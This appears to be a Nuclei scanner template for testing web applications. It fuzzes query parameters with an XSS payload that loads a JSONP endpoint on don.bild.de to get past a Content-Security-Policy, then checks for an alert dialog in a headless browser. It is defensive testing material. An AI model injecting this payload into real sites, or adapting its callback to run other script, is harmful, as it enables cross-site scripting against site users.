id: bild-don-csp-bypass

info:
  name: Content-Security-Policy Bypass via Bild Don
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,bild-don

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: bild_don_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://don.bild.de/glg/userDetails?callback=alert"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "bild_don_csp_xss == true"
